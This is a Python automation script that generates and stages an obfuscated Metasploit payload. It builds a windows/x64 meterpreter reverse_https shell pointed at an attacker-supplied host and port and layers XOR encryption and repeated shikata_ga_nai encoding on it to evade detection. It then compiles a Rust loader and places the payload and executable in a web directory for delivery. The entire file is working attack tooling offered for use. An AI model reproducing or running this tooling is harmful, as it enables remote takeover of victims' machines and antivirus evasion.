import os
import subprocess
import argparse

def get_user_input(prompt):
    """Prompt user for input if not provided via arguments."""
    return input(f"{prompt}: ")

def execute_command(command, description, cwd=None):
    """Execute a shell command within a specified directory with descriptive output."""
    print(f"Starting: {description}")
    try:
        result = subprocess.run(command, shell=True, cwd=cwd, check=True, capture_output=True, text=True)
        print(f"Completed: {description}\nOutput:\n{result.stdout}")
    except subprocess.CalledProcessError as e:
        print(f"Error during {description}: {e.stderr}")

# Argument parsing
parser = argparse.ArgumentParser(description="Script to generate and prepare payloads.")
parser.add_argument("--lhost", type=str, help="Local host for reverse HTTPS payload.")
parser.add_argument("--lport", type=str, help="Local port for reverse HTTPS payload.")
args = parser.parse_args()

# Use provided arguments or prompt the user for input
lhost = args.lhost if args.lhost else get_user_input("Enter LHOST")
lport = args.lport if args.lport else get_user_input("Enter LPORT")

# Set working directory
work_dir = '/payloads/rustyneedle'

# Check if work_dir exists
if not os.path.isdir(work_dir):
    raise FileNotFoundError(f"The specified directory '{work_dir}' does not exist. Please verify the path.")

# Debug: Print current working directory
print(f"Current working directory: {os.getcwd()}")

# Step 1: Generate the payload and apply multiple encoding/encryption layers
payload_command = (
    f"msfvenom -p windows/x64/meterpreter/reverse_https lhost={lhost} lport={lport} -f raw -o msfrust.bin | msfvenom -p generic/custom PAYLOADFILE=msfrust.bin -a x64 --platform windows --encrypt xor --encrypt-key cmdctlr3dT34mFTW -e x86/shikata_ga_nai -i 13 -f raw -o msfrust.bin"
)
execute_command(payload_command, "Payload generation and encryption", cwd=work_dir)

# Step 2: Encode the generated binary and move to the web directory
encode_command = "python3 encode.py msfrust.bin 15 msfrust.txt && cp msfrust.txt /var/www/html"
execute_command(encode_command, "Encoding binary and moving to web directory", cwd=work_dir)

# Step 3: Compile the Rust project targeting Windows platform
build_command = "cargo build --target x86_64-pc-windows-gnu --release"
execute_command(build_command, "Building Rust project for Windows", cwd=work_dir)

# Step 4: Prepare the executable, set permissions, and move to the web directory
work_dir = '/payloads/rustyneedle/target/x86_64-pc-windows-gnu/release'
finalize_command = "cp rustyneedle.exe msfrust.exe && chmod 777 msfrust.exe && mv msfrust.exe /var/www/html"
execute_command(finalize_command, "Finalizing executable and moving to web directory", cwd=work_dir)
